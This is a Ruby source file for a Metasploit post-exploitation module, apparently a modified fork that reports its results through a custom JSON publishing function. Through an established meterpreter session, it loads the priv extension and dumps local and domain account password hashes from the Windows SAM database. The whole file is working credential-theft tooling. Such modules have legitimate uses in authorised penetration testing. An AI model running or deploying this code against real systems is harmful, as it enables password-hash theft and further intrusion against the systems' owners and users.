##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'yajl'
require 'msf/core/post/windows/priv'


class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv


  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Gather Local and Domain Controller Account Password Hashes',
                      'Description'  => %q{
            This will dump local accounts from the SAM Database. If the target
          host is a Domain Controller, it will dump the Domain Account Database using the proper
          technique depending on privilege level, OS and role of the host.
        },
                      'License'      => MSF_LICENSE,
                      'Author'       => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))
    register_options(
            [

            ])
    @smb_port = 445
    # Constants for SAM decryption
    @sam_lmpass   = "LMPASSWORD\x00"
    @sam_ntpass   = "NTPASSWORD\x00"
    @sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
    @sam_numeric  = "0123456789012345678901234567890123456789\x00"
    @sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
    @sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

  end

  # Run Method for when run command is issued
  def run
    if session.type == "shell"
      pub_json_result(false,
                      "Unsupport shell type",
                      nil,
                      self.uuid)
      return
    end

    unless session.platform == "windows"

      pub_json_result(false,
                      'linux did not have priv extensions',
                      nil,
                      self.uuid)
      return
    end

    if session.arch == ARCH_X86 and sysinfo['Architecture'] == ARCH_X64

      pub_json_result(false,
                      'x64 platform requires x64 meterpreter',
                      nil,
                      self.uuid)
      return
    end

    unless client.priv
      vprint_status("Loading priv extension...")
      begin
        client.core.use("priv")
      rescue Errno::ENOENT
        pub_json_result(false,
                        'load priv failed',
                        nil,
                        self.uuid)
        return
      end
    end


    print_status("Running module against #{sysinfo['Computer']}")

    data = session.priv.sam_hashes
    pub_json_result(true,
                    nil,
                    data,
                    self.uuid)

  end

end
